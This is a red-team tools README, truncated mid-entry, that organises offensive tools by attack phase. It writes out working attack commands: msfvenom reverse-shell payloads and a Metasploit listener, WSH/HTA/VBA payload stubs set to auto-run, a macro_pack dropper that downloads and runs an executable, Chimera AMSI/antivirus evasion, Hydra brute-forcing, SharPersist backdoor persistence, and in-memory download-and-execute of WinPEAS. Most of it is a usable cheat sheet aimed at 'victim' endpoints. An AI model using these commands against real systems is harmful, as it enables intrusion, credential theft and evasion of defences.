# RedTeam-Tools

This github repository contains a collection of **tools** and **resources** that can be useful for **red teaming activities**. 

Some of the tools may be specifically designed for red teaming, while others are more general-purpose and can be adapted for use in a red teaming context.

> ℹ️ **Note:** *The materials in this repository are for informational and educational purposes only. They are not intended for use in any illegal activities.*

---------------
# Table of Contents

1. [Reconnaissance](#reconnaissance)
    - [crt.sh -> httprobe -> EyeWitness](#crtsh---httprobe---eyewitness)
    - [jsendpoints](#jsendpoints)
    - [nuclei](#nuclei)
    - [certSniff](#certsniff)
    - [gobuster](#gobuster)
    - [dnsrecon](#dnsrecon)
    - [Shodan.io](#shodanio)
    - [AORT (All in One Recon Tool)](#aort)
    - [spoofcheck](#spoofcheck)
    - [AWSBucketDump](#awsbucketdump)
    - [GitHarvester](#githarvester)
    - [truffleHog](#trufflehog)
2. [Resource Development](#resource-development)
    - [Chimera](#chimera)
    - [msfvenom](#msfvenom)
    - [WSH](#wsh)
    - [HTA](#hta)
    - [VBA](#vba)
3. [Initial Access](#initial-access)
    - [Bash Bunny](#bash-bunny)
    - [EvilGoPhish](#evilgophish)
    - [The Social-Engineer Toolkit](#social-engineer-toolkit-set)
    - [Hydra](#hydra)
    - [SquarePhish](#squarephish)
    - [King Phisher](#king-phisher)
4. [Execution](#execution)
    - [Donut](#donut)
    - [Macro_pack](#macro_pack)
    - [PowerSploit](#powersploit)
    - [Rubeus](#rubeus)
    - [SharpUp](#sharpup)
5. [Persistence](#persistence)
    - [Impacket](#impacket)
    - [Empire](#empire)
    - [SharPersist](#sharpersist)
6. [Privilege Escalation](#privilege-escalation)
    - [LinPEAS](#linpeas)
    - [WinPEAS](#winpeas)
    - [linux-smart-enumeration](#linux-smart-enumeration)
7. [Defense Evasion](#defense-evasion)
    - [Invoke-Obfuscation](#invoke-obfuscation)
8. [Credential Access](#credential-access)
    - [Mimikatz](#mimikatz)
    - [LaZagne](#lazagne)
    - [hashcat](#hashcat)
    - [John the Ripper](#john-the-ripper)
9. [Discovery](#discovery)
    - [PCredz](#pcredz)
    - [PingCastle](#pingcastle)
10. [Lateral Movement](#lateral-movement)
    - [crackmapexec](#crackmapexec)
    - [Enabling RDP](#enabling-rdp)
    - [Upgrading shell to meterpreter](#upgrading-shell-to-meterpreter)
    - [Forwarding Ports](#forwarding-ports)
    - [Jenkins reverse shell](#jenkins-reverse-shell)
11. [Collection](#collection)
    - [BloodHound](#bloodhound)
12. [Command and Control](#command-and-control)
    - [Havoc](#havoc)
13. [Exfiltration](#exfiltration)
    - [PyExfil](#pyexfil)
    - [Powershell RAT](#powershell-rat)
14. [Impact](#impact)
    - ...
    
Reconnaissance
====================

### [🔙](#redteam-tools)crt.sh -> httprobe -> EyeWitness

I have put together a bash one-liner that: 
- Passively collects a list of subdomains from certificate associations ([crt.sh](https://crt.sh/))
- Actively requests each subdomain to verify it's existance ([httprobe](https://github.com/tomnomnom/httprobe))
- Actively screenshots each subdomain for manual review ([EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness))

**Usage:** 

```bash
domain=DOMAIN_COM;rand=$RANDOM;curl -fsSL "https://crt.sh/?q=${domain}" | pup 'td text{}' | grep "${domain}" | sort -n | uniq | httprobe > /tmp/enum_tmp_${rand}.txt; python3 /usr/share/eyewitness/EyeWitness.py -f /tmp/enum_tmp_${rand}.txt --web
```

*Note: You must have [httprobe](https://github.com/tomnomnom/httprobe), [pup](https://github.com/EricChiang/pup) and [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) installed and change 'DOMAIN_COM' to the target domain. You are able to run this script concurrently in terminal windows if you have multiple target root domains*

![image](https://user-images.githubusercontent.com/100603074/192104474-5836138a-4a61-44fd-b3e3-b2a908c2928e.png)

![image](https://user-images.githubusercontent.com/100603074/192104501-e038aff8-1e51-4cc3-a286-54e93408ed4e.png)

### [🔙](#redteam-tools)[jsendpoints](https://twitter.com/renniepak/status/1602620834463588352)

A JavaScript bookmarklet for extracting all webpage endpoint links on a page.

Created by [@renniepak](https://twitter.com/renniepak), this JavaScript code snippet can be used to extract all endpoints (starting with /) from the current webpage DOM including all external script sources embedded on the webpage.

```javascript
javascript:(function(){var scripts=document.getElementsByTagName("script"),regex=/(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))/g;const results=new Set;for(var i=0;i<scripts.length;i++){var t=scripts[i].src;""!=t&&fetch(t).then(function(t){return t.text()}).then(function(t){var e=t.matchAll(regex);for(let r of e)results.add(r[0])}).catch(function(t){console.log("An error occurred: ",t)})}var pageContent=document.documentElement.outerHTML,matches=pageContent.matchAll(regex);for(const match of matches)results.add(match[0]);function writeResults(){results.forEach(function(t){document.write(t+"<br>")})}setTimeout(writeResults,3e3);})();
```

**Usage (Bookmarklet)** 

Create a bookmarklet...

- `Right click your bookmark bar`
- `Click 'Add Page'`
- `Paste the above Javascript in the 'url' box`
- `Click 'Save'`

...then visit the victim page in the browser and click the bookmarklet.

![image](https://user-images.githubusercontent.com/100603074/207563211-6c69711a-f7e7-4451-862b-80c9849df7fe.png)

**Usage (Console)** 

Paste the above Javascript into the console window `F12` and press enter. 

![image](https://user-images.githubusercontent.com/100603074/207563598-d70171b5-823e-491e-a6d5-8657af28b0e5.png)

### [🔙](#redteam-tools)[nuclei](https://github.com/projectdiscovery/nuclei)

Fast vulnerability scanner that uses .yaml templates to search for specific issues.

**Install:** 

```bash
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
```

**Usage:** 

```bash
cat domains.txt | nuclei -t /PATH/nuclei-templates/
```

![image](https://user-images.githubusercontent.com/100603074/205439027-2afe4ef8-fc7a-410d-934f-f8d325a8176e.png)

### [🔙](#redteam-tools)[certSniff](https://github.com/A-poc/certSniff)

certSniff is a Certificate Transparency logs keyword watcher I wrote in Python. It uses the certstream library to watch for certificate creation logs that contain keywords, defined in a file.

You can set this running with several keywords relating to your victim domain, any certificate creations will be recorded and may lead to the discovery of domains you were previously unaware of.

**Install:** 

```bash
git clone https://github.com/A-poc/certSniff;cd certSniff/;pip install -r requirements.txt
```

**Usage:** 

```python
python3 certSniff.py -f example.txt
```

![image](https://user-images.githubusercontent.com/100603074/206023792-ef251912-00c0-48e1-8691-71438cf7dd11.png)

### [🔙](#redteam-tools)[gobuster](https://www.kali.org/tools/gobuster/)

Nice tool for brute forcing file/folder paths on a victim website.

**Install:** 

```bash
sudo apt install gobuster
```

**Usage:** 

```bash
gobuster dir -u "https://google.com" -w /usr/share/wordlists/dirb/big.txt --wildcard -b 301,401,403,404,500 -t 20
```

![image](https://user-images.githubusercontent.com/100603074/192146594-86f04a85-fce3-4c4c-bcd6-2bf6a6222241.png)


### [🔙](#redteam-tools)[dnsrecon](https://www.kali.org/tools/dnsrecon/#dnsrecon)

dnsrecon is a pyhton tool for enumerating DNS records (MX, SOA, NS, A, AAAA, SPF and TXT) and can provide a number of new associated victim hosts to pivot into from a single domain search.

**Install:** 

```bash
sudo apt install dnsrecon
```

**Usage:** 

```bash
dnsrecon -d google.com
```

![image](https://user-images.githubusercontent.com/100603074/191689049-624db340-8adb-4a97-be8d-b7177f409a8b.png)

### [🔙](#redteam-tools)[shodan.io](https://www.shodan.io/dashboard)

Shodan crawls public infrastructure and displays it in a searchable format. Using a company name, domain name, IP address it is possible to discover potentially vulnerable systems relating to your target via shodan.

![image](https://user-images.githubusercontent.com/100603074/191689282-70f99fe9-aa08-4cd3-b881-764eface8546.png)

### [🔙](#redteam-tools)[AORT](https://github.com/D3Ext/AORT)

Tool for enumerating subdomains, enumerating DNS, WAF detection, WHOIS, port scan, wayback machine, email harvesting.

**Install:** 

```bash
git clone https://github.com/D3Ext/AORT; cd AORT; pip3 install -r requirements.txt
```

**Usage:** 

```python
python3 AORT.py -d google.com
```

![image](https://user-images.githubusercontent.com/100603074/192070398-aae0217d-69c4-460b-ae4c-51b045551268.png)

### [🔙](#redteam-tools)[spoofcheck](https://github.com/BishopFox/spoofcheck)

A program that checks if a domain can be spoofed from. The program checks SPF and DMARC records for weak configurations that allow spoofing. Additionally it will alert if the domain has DMARC configuration that sends mail or HTTP requests on failed SPF/DKIM emails.

Domains are spoofable if any of the following conditions are met:

- Lack of an SPF or DMARC record
- SPF record never specifies `~all` or `-all`
- DMARC policy is set to `p=none` or is nonexistent

**Install:**

```bash
git clone https://github.com/BishopFox/spoofcheck; cd spoofcheck; pip install -r requirements.txt
```

**Usage:** 

```bash
./spoofcheck.py [DOMAIN]
```

![image](https://user-images.githubusercontent.com/100603074/208209744-dfff6dd6-f53c-41a2-b3b7-bfc6bfb9b521.png)

### [🔙](#redteam-tools)[AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump)

AWSBucketDump is a tool to quickly enumerate AWS S3 buckets to look for interesting files. It's similar to a subdomain bruteforcer but is made specifically for S3 buckets and also has some extra features that allow you to grep for files, as well as download interesting files.

**Install:**

```
git clone https://github.com/jordanpotti/AWSBucketDump; cd AWSBucketDump; pip install -r requirements.txt
```

**Usage:** 

```
usage: AWSBucketDump.py [-h] [-D] [-t THREADS] -l HOSTLIST [-g GREPWORDS] [-m MAXSIZE]

optional arguments:
  -h, --help    show this help message and exit
  -D            Download files. This requires significant diskspace
  -d            If set to 1 or True, create directories for each host w/ results
  -t THREADS    number of threads
  -l HOSTLIST
  -g GREPWORDS  Provide a wordlist to grep for
  -m MAXSIZE    Maximum file size to download.

 python AWSBucketDump.py -l BucketNames.txt -g interesting_Keywords.txt -D -m 500000 -d 1
```

### [🔙](#redteam-tools)[GitHarvester](https://github.com/metac0rtex/GitHarvester)

Nice tool for finding information from GitHub with regex, with the ability to search specific GitHub users and/or projects.

**Install:**

```
git clone https://github.com/metac0rtex/GitHarvester; cd GitHarvester
```

**Usage:** 

```
./githarvester.py
```

### [🔙](#redteam-tools)[truffleHog](https://github.com/dxa4481/truffleHog)

TruffleHog is a tool that scans git repositories and looks for high-entropy strings and patterns that may indicate the presence of secrets, such as passwords and API keys. With TruffleHog, you can quickly and easily find sensitive information that may have been accidentally committed and pushed to a repository.

**Install (Binaries):** [Link](https://github.com/trufflesecurity/trufflehog/releases)

**Install (Go):**

```
git clone https://github.com/trufflesecurity/trufflehog.git; cd trufflehog; go install
```

**Usage:** 

```
trufflehog https://github.com/trufflesecurity/test_keys
```

![image](https://user-images.githubusercontent.com/100603074/208212273-137cb6ef-b0e6-42f7-8fd3-ac6a5cfe6a40.png)


Resource Development
====================

### [🔙](#redteam-tools)[Chimera](https://github.com/tokyoneon/Chimera)

Chimera is a PowerShell obfuscation script designed to bypass AMSI and antivirus solutions. It digests malicious PS1's known to trigger AV and uses string substitution and variable concatenation to evade common detection signatures.

**Install:** 

```bash
sudo apt-get update && sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git
sudo git clone https://github.com/tokyoneon/chimera /opt/chimera
sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/
sudo chmod +x chimera.sh; ./chimera.sh --help
```

**Usage:** 

```bash
./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 3 -o /tmp/chimera.ps1 -v -t powershell,windows,\
copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\
invoke-expression,out-string,write-error -j -g -k -r -p
```

![image](https://user-images.githubusercontent.com/100603074/209867736-5c35cec0-9227-4f18-a439-a5c954342818.png)

### [🔙](#redteam-tools)[msfvenom](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)

Msfvenom allows the creation of payloads for various operating systems in a wide range of formats. It also supports obfuscation of payloads for AV bypass.

**Set Up Listener**

```shell
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST your-ip 
set LPORT listening-port 
run
```

#### Msfvenom Commands

**PHP:** 

```bash
msfvenom -p php/meterpreter/reverse_tcp lhost =192.168.0.9 lport=1234 R
```

**Windows:** 

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

**Linux:** 

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

**Java:** 

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

**HTA:** 

```bash
msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh > shell.hta
```

![image](https://user-images.githubusercontent.com/100603074/192070870-2e65fc9f-6534-42e2-af27-9d8b54a82f0b.png)

### [🔙](#redteam-tools)WSH

**Creating payload:** 

```vbs
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

**Execute:** 

```bash
wscript payload.vbs
cscript.exe payload.vbs
wscript /e:VBScript payload.txt //If .vbs files are blacklisted
```

### [🔙](#redteam-tools)HTA

**Creating payload:**

```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

**Execute:** Run file

### [🔙](#redteam-tools)VBA

**Creating payload:**

```python
Sub calc()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

**Execute:** Set function to Auto_Open() in macro enabled document

Initial Access
====================

### [🔙](#redteam-tools)[Bash Bunny](https://shop.hak5.org/products/bash-bunny)

The Bash Bunny is a physical USB attack tool and multi-function payload delivery system. It is designed to be plugged into a computer's USB port and can be programmed to perform a variety of functions, including manipulating and exfiltrating data, installing malware, and bypassing security measures.

[hackinglab: Bash Bunny – Guide](https://hackinglab.cz/en/blog/bash-bunny-guide/)

[Hak5 Documentation](https://docs.hak5.org/bash-bunny/)

[Nice Payload Repo](https://github.com/hak5/bashbunny-payloads)

[Product Page](https://hak5.org/products/bash-bunny)

![image](https://user-images.githubusercontent.com/100603074/209868292-cc02ce20-7d8e-4019-b953-7082fb0eb828.png)

### [🔙](#redteam-tools)[EvilGoPhish](https://github.com/fin3ss3g0d/evilgophish)

evilginx2 + gophish. (GoPhish) Gophish is a powerful, open-source phishing framework that makes it easy to test your organization's exposure to phishing. (evilginx2) Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication

**Install:** 

```bash
git clone https://github.com/fin3ss3g0d/evilgophish
```

**Usage:**

```
Usage:
./setup <root domain> <subdomain(s)> <root domain bool> <redirect url> <feed bool> <rid replacement> <blacklist bool>
 - root domain                     - the root domain to be used for the campaign
 - subdomains                      - a space separated list of evilginx2 subdomains, can be one if only one
 - root domain bool                - true or false to proxy root domain to evilginx2
 - redirect url                    - URL to redirect unauthorized Apache requests
 - feed bool                       - true or false if you plan to use the live feed
 - rid replacement                 - replace the gophish default "rid" in phishing URLs with this value
 - blacklist bool                  - true or false to use Apache blacklist
Example:
  ./setup.sh example.com "accounts myaccount" false https://redirect.com/ true user_id false
```

![image](https://user-images.githubusercontent.com/100603074/191007680-890acda1-72ec-429e-9c91-b2cae55d7189.png)

### [🔙](#redteam-tools)[Social Engineer Toolkit (SET)](https://github.com/IO1337/social-engineering-toolkit)

This framework is great for creating campaigns for initial access, 'SET has a number of custom attack vectors that allow you to make a believable attack quickly'.

**Install:** 

```bash
git clone https://github.com/IO1337/social-engineering-toolkit; cd set; python setup.py install
```

**Usage:** 

```bash
python3 setoolkit
```

![image](https://user-images.githubusercontent.com/100603074/191690233-e1f4255a-514e-4887-94da-b8a3396025f0.png)

### [🔙](#redteam-tools)[Hydra](https://github.com/vanhauser-thc/thc-hydra)

Nice tool for logon brute force attacks. Can bf a number of services including SSH, FTP, TELNET, HTTP etc.

**Install:** 

```bash
sudo apt install hydra
```

**Usage:**

```bash
hydra -L USER.TXT -P PASS.TXT 1.1.1.1 http-post-form "login.php:username-^USER^&password=^PASS^:Error"
hydra -L USER.TXT -P PASS.TXT 1.1.1.1 ssh
```

![image](https://user-images.githubusercontent.com/100603074/193459614-365876d5-09da-4f29-b850-0480944f0097.png)

### [🔙](#redteam-tools)[SquarePhish](https://github.com/secureworks/squarephish)

SquarePhish is an advanced phishing tool that uses a technique combining  OAuth Device code authentication flow and QR codes (See [PhishInSuits](https://github.com/secureworks/PhishInSuits) for more about OAuth Device Code flow for phishing attacks).

Attack Steps:

- Send malicious QR code to victim
- Victim scans QR code with mobile device
- Victim directed to attacker controlled server (Triggering OAuth Device Code authentication flow process)
- Victim emailed MFA code (Triggering OAuth Device Code flow 15 minute timer)
- Attacker polls for authentication
- Victim enters code into legit Microsoft website
- Attacker saves authentication token

**Install:** 

```bash
git clone https://github.com/secureworks/squarephish; cd squarephish; pip install -r requirements.txt
```

**Note:** *Before using either module, update the required information in the settings.config file noted with `Required`.*

**Usage (Email Module):**

```
usage: squish.py email [-h] [-c CONFIG] [--debug] [-e EMAIL]

optional arguments:
  -h, --help            show this help message and exit

  -c CONFIG, --config CONFIG
                        squarephish config file [Default: settings.config]

  --debug               enable server debugging

  -e EMAIL, --email EMAIL
                        victim email address to send initial QR code email to
```

**Usage (Server Module):**

```
usage: squish.py server [-h] [-c CONFIG] [--debug]

optional arguments:
  -h, --help            show this help message and exit

  -c CONFIG, --config CONFIG
                        squarephish config file [Default: settings.config]

  --debug               enable server debugging
```

![image](https://user-images.githubusercontent.com/100603074/208217359-70e3ebd4-5cbf-40b9-9e4b-ca1608e4422f.png)
 

### [🔙](#redteam-tools)[King Phisher](https://github.com/securestate/king-phisher)

King Phisher is a tool that allows attackers to create and send phishing emails to victims to obtain sensitive information.

It includes features like customizable templates, campaign management, and email sending capabilities, making it a powerful and easy-to-use tool for carrying out phishing attacks. With King Phisher, atackers can target individuals or organizations with targeted and convincing phishing emails, increasing the chances of success in their attacks.

**Install (Linux - Client & Server):** 

```bash
wget -q https://github.com/securestate/king-phisher/raw/master/tools/install.sh && \
sudo bash ./install.sh
```

**Usage:**

Once King Phisher has been installed please follow the [wiki page](https://github.com/rsmusllp/king-phisher/wiki/Getting-Started) to setup SSH, Database config, SMTP server etc.

![image](https://user-images.githubusercontent.com/100603074/208217377-a6d36613-4ffe-486d-a630-99ed1bb7ed2d.png)

Execution
====================

### [🔙](#redteam-tools)[Donut](https://github.com/TheWover/donut/)

A tool for in-memory execution of VBScript, JScript, EXE, DLL files and dotNET assemblies. It can be used to load and run custom payloads on target systems without the need to drop files to disk.

**Install: (Windows)** 

```bash
git clone http://github.com/thewover/donut.git
```

To generate the loader template, dynamic library donut.dll, the static library donut.lib and the generator donut.exe. Start an x64 Microsoft Visual Studio Developer Command Prompt, change to the directory where you cloned the Donut repository and enter the following:

```bash
nmake -f Makefile.msvc
```

To do the same, except using MinGW-64 on Windows or Linux, change to the directory where you cloned the Donut repository and enter the following:

```bash
make -f Makefile.mingw
```

**Install: (Linux)** 

```bash
pip3 install donut-shellcode
```

**Usage:** 

```bash
# Creating shellcode from an XSL file that pops up a calculator.
shellcode = donut.create(file=r"C:\\Tools\\Source\\Repos\\donut\\calc.xsl")

# Creating shellcode from an unmanaged DLL. Invokes DLLMain.
shellcode = donut.create(file=r"C:\Tools\Source\Repos\donut\payload\test\hello.dll")
```

For full usage information, see the donut [GitHub Page](https://github.com/TheWover/donut/#4-usage).

See [a recent blog post](https://thewover.github.io/Bear-Claw/) from The Wover for more info.

![image](https://user-images.githubusercontent.com/100603074/210077893-9d42cc2f-0ea0-414f-8103-42e29429321b.png)

### [🔙](#redteam-tools)[Macro_pack](https://github.com/sevagas/macro_pack)

A tool used to automatize the obfuscation and generation of Office documents, VB scripts, shortcuts, and other formats for red teaming.

**Install: (Binary)** 

1. Get the latest binary from [https://github.com/sevagas/macro_pack/releases/](https://github.com/sevagas/macro_pack/releases/)
2. Download binary on PC with genuine Microsoft Office installed.
3. Open console, CD to binary dir and call the binary

**Install: (Git)** 

```bash
git clone https://github.com/sevagas/macro_pack.git
cd macro_pack
pip3 install -r requirements.txt
```

**Usage:** 

```bash
# Help Page
python3 macro_pack.py  --help

# List all supported file formats
macro_pack.exe --listformats

# Obfuscate the vba file generated by msfvenom and puts result in a new VBA file.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba

# Obfuscate Empire stager VBA file and generate a MS Word document:
macro_pack.exe -f empire.vba -o -G myDoc.docm

# Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)
echo "https://myurl.url/payload.exe" "dropped.exe" |  macro_pack.exe -o -t DROPPER -G "drop.xlsm" 

# Execute calc.exe via Dynamic Data Exchange (DDE) attack
echo calc.exe | macro_pack.exe --dde -G calc.xslx
```

![image](https://user-images.githubusercontent.com/100603074/209868800-7fbcfdec-8ae8-4693-8438-feebc2309667.png)

### [🔙](#redteam-tools)[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

A collection of PowerShell scripts and modules that can be used to achieve a variety of red teaming objectives.

Some of the features of PowerSploit:

- Dump password hashes and extract clear-text passwords from memory
- Escalate privileges and bypass security controls
- Execute arbitrary PowerShell code and bypass execution restrictions
- Perform network reconnaissance and discovery
- Generate payloads and execute exploits

**Install:** *1. Save to PowerShell modules folder*

First you will need to download the [PowerSploit Folder](https://github.com/PowerShellMafia/PowerSploit) and save it to your PowerShell modules folder.

Your PowerShell modules folder path can be found with the following command:

```
$Env:PSModulePath
```

**Install:** *2. Install PowerSploit as a PowerShell module*

You will then need to install the PowerSploit module (use the name of the downloaded folder). 

**Note:** *Your PowerShell execution policy might block you, to fix this run the following command.*

```
powershell.exe -ep bypass
```

Now you can install the PowerSploit module.

```
Import-Module PowerSploit
```

**Usage:** 

```
Get-Command -Module PowerSploit
```

![image](https://user-images.githubusercontent.com/100603074/208247898-481f48c0-fe51-482f-b7c6-463bfecbd581.png)


### [🔙](#redteam-tools)[Rubeus](https://github.com/GhostPack/Rubeus)

A tool that can be used to perform various actions related to Microsoft Active Directory (AD) environments, such as dumping password hashes, creating/deleting users, and modifying user properties.

Some of the features of Rubeus:

- Kerberoasting
- Golden ticket attacks
- Silver ticket attacks

**Install: (Download)** 

You can install the unofficial pre-compiled Rubeus binary [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe). 

**Install: (Compile)** 

Rubeus is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Open the rubeus [project .sln](https://github.com/GhostPack/Rubeus), choose "Release", and build.

**Usage:** 

```
Rubeus.exe -h
```

![image](https://user-images.githubusercontent.com/100603074/208250015-674a6fee-95b7-4edf-bd59-fe459cd235ed.png)


### [🔙](#redteam-tools)[SharpUp](https://github.com/GhostPack/SharpUp)

A nice tool for checking a victims endpoint for vulnerabilites relating to high integrity processes, groups, hijackable paths, etc.

**Install: (Download)** 

You can install the unofficial pre-compiled SharpUp binary [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe). 

**Install: (Compile)** 

SharpUp is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Open the SharpUp [project .sln](https://github.com/GhostPack/SharpUp), choose "Release", and build.

**Usage:** 

```bash
SharpUp.exe audit
#-> Runs all vulnerability checks regardless of integrity level or group membership.

SharpUp.exe HijackablePaths
#-> Check only if there are modifiable paths in the user's %PATH% variable.

SharpUp.exe audit HijackablePaths
#-> Check only for modifiable paths in the user's %PATH% regardless of integrity level or group membership.
```

![image](https://user-images.githubusercontent.com/100603074/210079939-e709cced-04a2-44a5-9da0-f387bc6599b1.png)

Persistence
====================

### [🔙](#redteam-tools)[Impacket](https://github.com/fortra/impacket)

Impacket provides a set of low-level Python bindings for various network protocols, including SMB, Kerberos, and LDAP, as well as higher-level libraries for interacting with network services and performing specific tasks such as dumping password hashes and creating network shares.

It also includes a number of command-line tools that can be used to perform various tasks such as dumping SAM databases, enumerating domain trusts, and cracking Windows passwords.

**Install:** 

```bash
python3 -m pip install impacket
```

**Install: (With Example Scripts)** 

Download and extract [the package](https://github.com/fortra/impacket), then navigate to the install folder and run...

```bash
python3 -m pip install .
```

**Usage:** 

```bash
# Extract NTLM hashes with local files
secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# Gets a list of the sessions opened at the remote hosts
netview.py domain/user:password -target 192.168.10.2

# Retrieves the MSSQL instances names from the target host.
mssqlinstance.py 192.168.1.2

# This script will gather data about the domain's users and their corresponding email addresses.
GetADUsers.py domain/user:password@IP
```

Great [cheat sheet](https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/) for Impacket usage.

![image](https://user-images.githubusercontent.com/100603074/210079475-a13f7fe2-7801-40dd-977b-e179d0658b47.png)

### [🔙](#redteam-tools)[Empire](https://github.com/EmpireProject/Empire)

Empire is a post-exploitation framework that allows you to generate payloads for establishing remote connections with victim systems.

Once a payload has been executed on a victim system, it establishes a connection back to the Empire server, which can then be used to issue commands and control the target system.

Empire also includes a number of built-in modules and scripts that can be used to perform specific tasks, such as dumping password hashes, accessing the Windows registry, and exfiltrating data.

**Install:** 

```bash
git clone https://github.com/EmpireProject/Empire
cd Empire
sudo ./setup/install.sh
```

**Usage:** 

```bash
# Start Empire
./empire

# List live agents
list agents

# List live listeners
list listeners
```

Nice usage [cheat sheet](https://github.com/HarmJ0y/CheatSheets/blob/master/Empire.pdf) by [HarmJoy](https://github.com/HarmJ0y).

![image](https://user-images.githubusercontent.com/100603074/210080911-b3c7572a-a0dd-4664-a3e1-46b343db8a79.png)

### [🔙](#redteam-tools)[SharPersist](https://github.com/mandiant/SharPersist)

A Windows persistence toolkit written in C#.

The project has a [wiki](https://github.com/mandiant/SharPersist/wiki).

**Install: (Binary)** 

You can find the most recent release [here](https://github.com/mandiant/SharPersist/releases).

**Install: (Compile)** 

- Download the project files from the [GitHub Repo](https://github.com/mandiant/SharPersist).
- Load the Visual Studio project up and go to "Tools" --> "NuGet Package Manager" --> "Package Manager Settings"
- Go to "NuGet Package Manager" --> "Package Sources"
- Add a package source with the URL "https://api.nuget.org/v3/index.json"
- Install the Costura.Fody NuGet package. The older version of Costura.Fody (3.3.3) is needed, so that you do not need Visual Studio 2019.
	- `Install-Package Costura.Fody -Version 3.3.3`
- Install the TaskScheduler package
	- `Install-Package TaskScheduler -Version 2.8.11`
- You can now build the project yourself!

**Usage:**

A full list of usage examples can be found [here](https://github.com/mandiant/SharPersist#adding-persistence-triggers-add).

```
#KeePass
SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m add 

#Registry
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add

#Scheduled Task Backdoor
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add

#Startup Folder
SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
```

![image](https://user-images.githubusercontent.com/100603074/208880117-3ce7eefc-9e0b-477d-ada4-b3867909ff38.png)


Privilege Escalation
====================

### [🔙](#redteam-tools)[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

LinPEAS is a nice verbose privilege escalation for finding local privesc routes on Linux endpoints. 

**Install + Usage:**

```bash
curl -L "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" | sh
```

![image](https://user-images.githubusercontent.com/100603074/192070104-8a121544-5c88-4c24-8b2e-590700b345e7.png)

### [🔙](#redteam-tools)[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

WinPEAS is a nice verbose privilege escalation for finding local privesc routes on Windows endpoints. 

**Install + Usage:** 

```bash
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```

![image](https://user-images.githubusercontent.com/100603074/192070193-fed8a0e8-b82a-4338-9209-6352f33ab6b8.png)

### [🔙](#redteam-tools)[linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

Linux smart enumeration is another good, less verbose, linux privesc tool for Linux.

**Install + Usage:** 

```bash
curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh
```

![image](https://user-images.githubusercontent.com/100603074/192070258-2fe8727a-4b75-430d-a84e-da6605750de9.png)

Defense Evasion
====================

### [🔙](#redteam-tools)[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

A PowerShell v2.0+ compatible PowerShell command and script obfuscator. If a victim endpoint is able to execute PowerShell then this tool is great for creating heavily obfuscated scripts.

**Install:** 

```bash
git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
```

**Usage:** 

```bash
./Invoke-Obfuscation
```

![image](https://user-images.githubusercontent.com/100603074/206557377-a522ab7a-5803-48b0-8f3e-d7d7b607e692.png)

Credential Access
====================

### [🔙](#redteam-tools)[Mimikatz](https://github.com/gentilkiwi/mimikatz)

Great tool for gaining access to hashed and cleartext passwords on a victims endpoint. Once you have gained privileged access to a system, drop this tool to collect some creds.

**Install:** 

1. Download the [mimikatz_trunk.7z](https://github.com/gentilkiwi/mimikatz/releases) file.
2. Once downloaded, the `mimikatz.exe` binary is in the `x64` folder.

**Usage:** 

```bash
.\mimikatz.exe
privilege::debug
```

![image](https://user-images.githubusercontent.com/100603074/208253562-5c58d412-ed3e-4ab5-b8e7-11092852c3d0.png)

### [🔙](#redteam-tools)[LaZagne](https://github.com/AlessandroZ/LaZagne)

Nice tool for extracting locally stored passwords from browsers, databases, games, mail, git, wifi, etc.

